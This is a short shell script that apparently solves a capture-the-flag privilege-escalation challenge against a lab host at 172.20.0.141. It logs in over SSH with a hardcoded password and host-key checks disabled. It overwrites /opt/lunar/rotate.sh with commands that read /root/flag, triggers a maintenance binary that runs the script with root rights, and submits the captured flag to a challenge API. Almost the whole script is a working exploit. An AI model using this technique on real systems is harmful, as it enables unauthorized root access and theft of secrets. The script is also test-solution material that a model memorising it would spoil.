#!/bin/sh
set -eu

host=172.20.0.141
user=cosmonaut
password='Luna-Relay-6'

nmap -Pn -n -p 22 "$host" >/dev/null
output=$(
  printf '%s\n' '#!/bin/sh' 'id' 'cat /root/flag' 'cat /root/.escalation-proof' |
    sshpass -p "$password" ssh -T -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$user@$host" 'cat > /opt/lunar/rotate.sh && /usr/local/bin/cluster-maint'
)
printf '%s\n' "$output"
flag=$(printf '%s\n' "$output" | grep -Eo 'BSY\{[^}]+\}' | head -n 1)
[ -n "$flag" ]
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "{\"challenge_id\":\"scl-challenge-frame-2ca7b2\",\"task_id\":\"task1\",\"flag\":\"$flag\"}"
printf '\n'
